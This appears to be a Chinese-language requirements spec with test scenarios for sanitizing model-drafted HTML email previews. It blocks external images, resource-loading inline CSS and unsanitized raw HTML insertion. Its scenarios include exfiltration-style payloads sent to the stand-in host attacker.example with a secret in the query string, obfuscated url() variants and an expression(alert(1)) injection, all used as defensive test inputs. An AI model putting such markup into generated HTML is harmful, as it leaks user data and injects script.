# agents/ai-output-rendering

## ADDED Requirements

### Requirement: HTML 预览里允许清单之外的图片不自动加载
模型起草的 HTML 在页面上预览时，图片地址不在允许清单内的，预览 SHALL NOT 含图片元素，也 SHALL NOT 含任何会让浏览器不经用户操作就请求该地址的元素或属性；原位置 SHALL 显示与 Markdown 渲染相同的不可点击文字提示。允许清单与 Markdown 渲染相同：以单个 `/` 开头、解析后不离开站内、规范化路径位于 `/api/files/` 之下。

#### Scenario: 外部图片不发请求
- **WHEN** 运行 `npx tsx src/lib/common/__tests__/sanitize-html.test.ts`（有 Chromium 时），在真实浏览器里把 `<p>您好</p><img src="https://attacker.example/p.png?d=SECRET" alt="报价">` 净化后放进页面
- **THEN** 浏览器没有向 `attacker.example` 发任何请求；预览里没有 `img` 元素，有「图片未加载」的文字提示，提示里没有地址的路径与查询串

#### Scenario: 变形地址与多来源属性
- **WHEN** 同一测试对 `//attacker.example/x`、`/\attacker.example/x`、`data:` 地址，以及带 `srcset` 的图片做同样的事
- **THEN** 都没有外部请求，都没有 `img` 元素留下

#### Scenario: 站内文件图片照常显示
- **WHEN** 同一测试净化 `<img src="/api/files/ai-chat/o1/a.png" alt="现场图">`
- **THEN** 预览里保留这张图片，地址是规范化后的站内路径

### Requirement: HTML 预览里的内联样式不能加载资源
预览里元素的内联样式 SHALL 只保留不会让浏览器加载资源的声明。含 `url()`、`image-set()` 或其它不在允许清单（`rgb`、`rgba`、`hsl`、`hsla`、`calc`）内的函数的声明 SHALL 被去掉；值里带反斜杠转义、注释或 `@` 的声明 SHALL 被去掉。颜色、间距、宽高、字体、对齐等普通声明 SHALL 保留。

#### Scenario: 背景图不发请求
- **WHEN** 运行同一测试（有 Chromium 时），在真实浏览器里净化并显示 `<div style="color:#333;background:url(https://attacker.example/b.png?d=SECRET)">正文</div>`
- **THEN** 浏览器没有向 `attacker.example` 发任何请求；`color:#333` 保留

#### Scenario: 转义与变体写法
- **WHEN** 运行同一测试的纯函数段，对 `background:u\72l(//x)`、`background-image:image-set("//x" 1x)`、`list-style:URL( //x )`、`background:/**/url(//x)`、`width:expression(alert(1))` 做净化
- **THEN** 这些声明都被去掉

#### Scenario: 普通样式保留
- **WHEN** 同一段净化 `color:#333; padding:8px 12px; background:#f5f5f5; width:100%; font-family:Arial, sans-serif; border:1px solid rgb(0,0,0); margin:calc(1em + 2px)`
- **THEN** 每一条声明都保留，顺序不变

### Requirement: 没有浏览器环境时不放行原文
`sanitizeHtml` 在没有浏览器环境（服务端渲染）时 SHALL 返回空字符串，SHALL NOT 原样返回传入的 HTML。

#### Scenario: 服务端调用
- **WHEN** 运行同一测试（Node 环境，没有 `window`），调用 `sanitizeHtml('<img src="https://attacker.example/x">')`
- **THEN** 返回空字符串

### Requirement: 直接渲染 HTML 的位置有清单
仓库里把 HTML 字符串直接放进页面的位置 SHALL 限于登记的清单；模型起草的 HTML SHALL 只经 `sanitizeHtml` 进入页面。清单之外出现新的位置时测试 SHALL 失败。

#### Scenario: 没有清单之外的位置
- **WHEN** 运行同一测试，扫描 `src/` 下全部 `.tsx` 与 `.ts`（不含测试）里的 `dangerouslySetInnerHTML`
- **THEN** 只出现在登记的四个文件里；其中两个邮件预览都把内容先交给 `sanitizeHtml`

### Requirement: 预览规则不改发出的邮件
本规则 SHALL 只改变预览在页面上的呈现。发出的邮件内容、服务端代码、数据结构 SHALL NOT 因此改变。

#### Scenario: 服务端与数据结构无改动
- **WHEN** 对本次改动运行 `git diff --stat main -- src/app/api prisma vercel.json`
- **THEN** 没有输出
